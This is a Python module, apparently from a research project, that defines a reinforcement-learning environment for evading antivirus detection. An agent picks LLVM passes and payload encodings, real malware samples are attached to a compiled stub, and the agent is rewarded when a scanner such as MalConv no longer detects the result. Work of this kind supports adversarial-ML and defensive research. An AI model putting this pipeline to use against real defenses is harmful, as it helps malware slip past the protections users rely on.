"""
Training environment for RL-based AV evasion.
"""

import os
import subprocess
import random
import time
import shutil
import glob
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple

import numpy as np

from ..config import (
    REWARD_BYPASS, REWARD_STEP_BONUS,
    REWARD_FAIL_EPISODE, REWARD_STEP_PENALTY,
)
from ..pe_utils import detect_pe_bits, get_pe_image_base, get_pe_subsystem, expand_size_of_image
from ..compiler import compile_to_exe, attach_payload
from ..scanner import build_scanner
from .base import BaseEnv


class TrainEnv(BaseEnv):
    """
    Gymnasium environment for training RL agents to evade AV detection.
    
    The agent learns to select LLVM optimization passes and payload
    encoding operations to modify PE stubs and evade detection.
    """
    
    def __init__(
        self,
        source_bc_32: str,
        source_bc_64: str,
        sample_dir: str,
        av_type: str = 'model',
        av_name: str = 'malconv',
        env_id: int = 0,
        delay_loop_plugin: Optional[str] = None
    ):
        """
        Initialize the training environment.
        
        Args:
            source_bc_32: Path to 32-bit stub bitcode.
            source_bc_64: Path to 64-bit stub bitcode.
            sample_dir: Directory containing malware samples.
            av_type: Type of AV target ('model' or 'engine').
            av_name: Name of the AV target.
            env_id: Environment ID (for parallel training).
            delay_loop_plugin: Path to DelayLoop.so plugin.
        """
        super().__init__()
        
        self.source_bc_32 = source_bc_32
        self.source_bc_64 = source_bc_64
        self.sample_dir = Path(sample_dir)
        self.av_type = av_type
        self.av_name = av_name
        self.env_id = env_id
        self.delay_loop_plugin = delay_loop_plugin
        self._bc_prefix = "ep"  # Prefix for bc files
        
        # Initialize spaces and state
        self._init_spaces()
        self._init_state()
        
        # Load samples
        all_sample_files = list(self.sample_dir.glob('*'))
        all_sample_files = [f for f in all_sample_files if f.is_file()]
        self.sample_files = all_sample_files
        
        # Initialize scanner
        try:
            self.scanner = build_scanner(av_type, av_name)
        except Exception as e:
            print(f"[Env {env_id}] Scanner initialization failed: {e}")
            self.scanner = None
        
        # Work directories
        self.base_work_dir = Path("outputs") / "train" / av_name
        self.base_work_dir.mkdir(parents=True, exist_ok=True)
        self.work_dir = self.base_work_dir / f"worker_{env_id}"
        self.work_dir.mkdir(exist_ok=True)
        
        # Episode tracking
        self.episode_count: int = 0
        self.current_payload: Optional[Path] = None
        
        # Statistics
        self.successful_episodes = 0
        self.total_rewards: List[float] = []
        
        # Filter samples
        self._filter_detectable_samples(all_sample_files)
        
    def _filter_detectable_samples(self, all_sample_files: List[Path]) -> None:
        """Filter samples to only include those detected by the AV."""
        cache_file = self.base_work_dir / f"trained_samples_{self.av_name}.txt"
        
        # Try to load from cache
        if cache_file.exists():
            try:
                with open(cache_file, 'r') as f:
                    cached_paths = [line.strip() for line in f if line.strip()]
                valid_paths = [Path(p) for p in cached_paths if Path(p).exists()]
                if len(valid_paths) > 0:
                    self.sample_files = valid_paths
                    print(f"[Env {self.env_id}] Loaded {len(self.sample_files)} "
                          f"detectable samples from cache")
                    return
            except:
                pass
        
        # Wait for Env 0 to finish filtering
        if self.env_id != 0:
            print(f"[Env {self.env_id}] Waiting for Env 0 to complete filtering...")
            while True:
                if cache_file.exists():
                    time.sleep(0.5)
                    try:
                        with open(cache_file, 'r') as f:
                            cached_paths = [line.strip() for line in f if line.strip()]
                        valid_paths = [Path(p) for p in cached_paths if Path(p).exists()]
                        if len(valid_paths) > 0:
                            self.sample_files = valid_paths
                            print(f"[Env {self.env_id}] Loaded {len(self.sample_files)} "
                                  f"detectable samples")
                            return
                    except:
                        pass
                time.sleep(1)
        
        if not self.scanner:
            print(f"[Env 0] Scanner unavailable, skipping sample filtering")
            return
        
        print(f"[Env 0] Starting sample filtering...")
        print(f"[Env 0] Total samples: {len(all_sample_files)}")
        
        detectable_samples = []
        filter_work_dir = self.base_work_dir / "filter_work"
        filter_work_dir.mkdir(exist_ok=True)
        
        for i, sample_file in enumerate(all_sample_files):
            try:
                with open(sample_file, 'rb') as f:
                    payload_data = f.read()
                
                bits = detect_pe_bits(payload_data)
                source_ir = self.source_bc_32 if bits == 32 else self.source_bc_64
                
                temp_bc = str(filter_work_dir / f"filter_{i}.bc")
                subprocess.run(["cp", source_ir, temp_bc], check=True, capture_output=True)
                
                self.current_bc = temp_bc
                self.current_bits = bits
                self.current_payload_data = payload_data
                self.encoding_sequence = []
                
                exe_file = self._compile_to_exe(temp_bc)
                if exe_file:
                    final_exe = self._attach_payload(exe_file)
                    if final_exe:
                        with open(final_exe, 'rb') as f:
                            response = self.scanner.analyse_sample(f.read())
                        
                        if response['result'] == 1:
                            detectable_samples.append(sample_file)
                        
                        try:
                            os.remove(final_exe)
                        except:
                            pass
                    try:
                        os.remove(exe_file)
                    except:
                        pass
                try:
                    os.remove(temp_bc)
                except:
                    pass
                
            except Exception:
                pass
            
            if (i + 1) % 50 == 0:
                print(f"[Env 0] Progress: {i+1}/{len(all_sample_files)}, "
                      f"found {len(detectable_samples)} detectable samples")
        
        try:
            shutil.rmtree(filter_work_dir)
        except:
            pass
        
        print(f"[Env 0] Filtering complete: {len(detectable_samples)}/"
              f"{len(all_sample_files)} samples detected")
        
        if len(detectable_samples) == 0:
            detectable_samples = all_sample_files
        
        self.sample_files = detectable_samples

        with open(cache_file, 'w') as f:
            for p in detectable_samples:
                f.write(str(p) + '\n')
        print(f"[Env 0] Results cached to: {cache_file}")
        
    def _cleanup_episode_files(self, episode_num: int) -> None:
        """Clean up temporary files from a previous episode."""
        if episode_num < 1:
            return
        
        patterns = [
            str(self.work_dir / f"ep{episode_num}.bc"),
            str(self.work_dir / f"ep{episode_num}.exe"),
            str(self.work_dir / f"ep{episode_num}_final.exe"),
            str(self.work_dir / f"ep{episode_num}_s*.bc"),
            str(self.work_dir / f"ep{episode_num}_s*.exe"),
        ]
        
        for pattern in patterns:
            for f in glob.glob(pattern):
                try:
                    os.remove(f)
                except:
                    pass
    
    def reset(
        self, 
        seed: Optional[int] = None, 
        options: Optional[Dict[str, Any]] = None
    ) -> Tuple[np.ndarray, Dict[str, Any]]:
        """Reset the environment for a new episode."""
        super().reset(seed=seed)
        
        self._cleanup_episode_files(self.episode_count)
        self.episode_count += 1
        self._bc_prefix = f"ep{self.episode_count}"
        
        # Select random sample
        self.current_payload = random.choice(self.sample_files)
        
        with open(self.current_payload, 'rb') as f:
            self.current_payload_data = f.read()
        
        # Detect PE architecture
        self.current_bits = detect_pe_bits(self.current_payload_data)
        source_ir = self.source_bc_32 if self.current_bits == 32 else self.source_bc_64
        
        # Copy initial IR
        self.current_bc = str(self.work_dir / f"ep{self.episode_count}.bc")
        subprocess.run(["cp", source_ir, self.current_bc], 
                      check=True, capture_output=True)
        
        # Reset state
        self._reset_state()
        
        return self._extract_features(), {}
    
    def step(
        self, 
        action: np.ndarray
    ) -> Tuple[np.ndarray, float, bool, bool, Dict[str, Any]]:
        """Execute one environment step."""
        self._process_action(action)
        
        truncated = (self.step_count >= self.max_steps)
        
        # Test current configuration
        detection_result = self._test_current_config()
        
        enc_str = ' -> '.join(self.encoding_sequence) if self.encoding_sequence else 'none'
        pass_str = ' -> '.join(self.pass_history) if self.pass_history else 'none'
        
        if detection_result == 0:  # Bypass successful
            reward = REWARD_BYPASS + (self.max_steps - self.step_count) * REWARD_STEP_BONUS
            self.successful_episodes += 1
            
            if self.episode_count % 20 == 0:
                print(f"[Env{self.env_id}] Ep{self.episode_count}: Bypass at step {self.step_count}! "
                      f"Pass:[{pass_str}], Enc:[{enc_str}]")
            
            info = {
                'pass_sequence': self.pass_history.copy(),
                'encoding_sequence': self.encoding_sequence.copy(),
                'bypassed': True,
                'steps_used': self.step_count,
            }
            return self._extract_features(), reward, True, False, info
        
        else:  # Not bypassed
            if truncated:
                reward = REWARD_FAIL_EPISODE
                if self.episode_count % 100 == 0:
                    print(f"[Env{self.env_id}] Ep{self.episode_count}: Failed, "
                          f"Pass:[{pass_str}], Enc:[{enc_str}]")
                
                info = {
                    'pass_sequence': self.pass_history.copy(),
                    'encoding_sequence': self.encoding_sequence.copy(),
                    'bypassed': False,
                }
                return self._extract_features(), reward, True, False, info
            else:
                reward = REWARD_STEP_PENALTY
                info = {
                    'pass_sequence': self.pass_history.copy(),
                    'encoding_sequence': self.encoding_sequence.copy(),
                    'bypassed': False,
                }
                return self._extract_features(), reward, False, False, info
        
    def _test_current_config(self) -> int:
        """Compile, attach payload, and test detection."""
        if not self.scanner:
            raise RuntimeError(f"[Env {self.env_id}] Scanner unavailable")
        
        exe_file = self._compile_to_exe(self.current_bc)
        if not exe_file:
            raise RuntimeError(
                f"[Env {self.env_id}] Compilation failed: {self.current_bc}\n"
                f"  Pass history: {self.pass_history}\n"
                f"  Payload: {self.current_payload}"
            )
        
        final_exe = self._attach_payload(exe_file)
        if not final_exe:
            raise RuntimeError(
                f"[Env {self.env_id}] Payload attachment failed: {exe_file}\n"
                f"  Encoding sequence: {self.encoding_sequence}"
            )
        
        with open(final_exe, 'rb') as f:
            response = self.scanner.analyse_sample(f.read())
        
        return response['result']
    
    def _compile_to_exe(self, bc_file: str) -> Optional[str]:
        """Compile bitcode to executable."""
        exe_file = bc_file.replace('.bc', '.exe')
        
        image_base = get_pe_image_base(self.current_payload_data)
        if image_base is None:
            image_base = 0x400000 if self.current_bits == 32 else 0x140000000
        
        subsystem = get_pe_subsystem(self.current_payload_data)
        
        result = compile_to_exe(bc_file, exe_file, self.current_bits, image_base, subsystem)
        
        if result:
            expand_size_of_image(exe_file, self.current_payload_data)
            return exe_file
        return None
    
    def _attach_payload(self, stub_exe: str) -> Optional[str]:
        """Attach encoded payload to stub."""
        final_exe = stub_exe.replace('.exe', '_final.exe')
        return attach_payload(
            stub_exe, 
            self.current_payload_data, 
            self.encoding_sequence, 
            final_exe
        )


def make_env(
    source_bc_32: str,
    source_bc_64: str,
    sample_dir: str,
    av_type: str,
    av_name: str,
    env_id: int,
    delay_loop_plugin: Optional[str] = None
):
    """
    Factory function for creating training environments.
    
    Used for parallel environment creation with SubprocVecEnv.
    """
    def _init():
        env = TrainEnv(
            source_bc_32, source_bc_64, sample_dir,
            av_type=av_type, av_name=av_name,
            env_id=env_id,
            delay_loop_plugin=delay_loop_plugin
        )
        return env
    return _init
